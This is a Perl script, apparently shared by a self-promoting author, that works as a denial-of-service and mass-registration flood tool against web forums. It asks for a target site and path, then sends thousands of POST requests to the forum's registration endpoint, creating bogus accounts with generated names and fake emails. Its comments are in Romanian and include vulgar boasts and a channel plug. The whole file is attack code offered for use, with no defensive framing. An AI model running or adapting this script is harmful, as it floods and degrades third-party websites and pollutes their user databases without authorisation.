#!/usr/bin/perl
use IO::Socket;
##########################################################
##		 _______ _______  		 #
##		 |______ |______  \    /		 #
##		 ______| |______   \  /		 #
##		                    /\    		 #
##Le dam sa sara in sus <3 	   /  \ #
##Baiatu nu schimba aici datele ca tot Samburel e regele 	 #
##Created By Samburel                                        #
##Hai cu un subscribe la SamburelYT                                      #
## Ii dai flood si beleste pula                                 #
##samburelyt@gmail.com                                   #
##OARKA POWER                                               #
##########################################################

print q{
############################################################
#       Samburel flood arhive DDOS attack premium	   #
#		Testeat pe site-uri de top			   #
#	    created By Samburel si nicio echipa bro am destul intelect sa-l fac singur <3           #
############################################################
};
$rand=rand(10);
print "Numele la site (ex: www.xxx.com): ";
$serv = <stdin>;
chop ($serv);
print "Subforum (ex: /forum/ sau /index.php/ sau /home): ";
$path = <stdin>;
chop ($path);
for ($i=0; $i<9999; $i++)
{
$name="sedXPL_".$rand.$i;
$data = "act=Reg&CODE=02&coppa_user=0&UserName=".$name."&PassWord=sedbotbeta&PassWord_Check=sedbotbeta&EmailAddress=".$name."\@host.com&EmailAddress_two=".$name."\@host.com&allow_admin_mail=1&allow_member_mail=1&day=11&month=11&year=1985&agree=1";
$len = length $data;
$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "Cennot Connect Host, it's can be beacuse the host dosed";
print $get1 "POST ".$path."index.php HTTP/1.0\n";
print $get1 "Host: ".$serv."\n";
print $get1 "Content-Type: application/x-www-form-urlencoded\n";
print $get1 "Content-Length: ".$len."\n\n";
print $get1 $data;
print "A picat gata <3 lasa-l asa ";
syswrite STDOUT, "picat - ";
}
print "Flood a fost oprit , site-ul a fost futut \n";

# Samburel [inceput in 2020 terminat in 2021]